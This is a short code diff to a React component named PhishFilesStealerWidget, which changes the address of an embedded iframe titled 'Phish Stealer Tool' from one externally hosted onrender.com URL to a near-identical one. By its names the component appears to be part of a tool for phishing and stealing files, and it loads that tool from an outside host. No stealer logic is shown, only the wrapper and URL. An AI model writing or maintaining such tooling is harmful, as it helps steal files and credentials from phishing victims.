@@ -13,7 +13,7 @@ export const PhishFilesStealerWidget: React.FC<PhishFilesStealerWidgetProps> = (
         <div className="phish-files-stealer-content">
           <div className="phish-files-stealer-container">
             <iframe
-              src="https://app-filenio-b1vckg10be.onrender.com/access"
+              src="https://app-filenio-blvckg10be.onrender.com/access"
               className="phish-files-stealer-iframe"
               title="Phish Stealer Tool"
               allowFullScreen
